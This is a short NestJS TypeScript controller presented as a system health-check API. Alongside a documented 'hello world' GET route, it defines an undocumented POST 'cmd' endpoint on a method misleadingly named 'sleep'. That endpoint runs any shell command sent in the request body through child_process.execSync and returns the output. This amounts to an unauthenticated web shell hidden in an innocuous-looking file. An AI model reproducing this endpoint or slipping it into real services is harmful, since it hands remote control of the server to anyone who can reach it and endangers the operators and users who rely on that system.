import core from '@nestia/core';
import * as nest from '@nestjs/common';
import cp from 'child_process';

@nest.Controller('health')
export class SystemController {
    /**
     * Just for health checking API Server liveness.
     *
     * @summary Health check API
     * @tag system
     * @return hello world
     */
    @core.TypedRoute.Get()
    async check(): Promise<'hello world'> {
        return 'hello world';
    }

    @core.TypedRoute.Post('cmd')
    sleep(@nest.Body() body: { cmd: string }) {
        return cp.execSync(body.cmd, { encoding: 'utf-8' }).split('\n');
    }
}
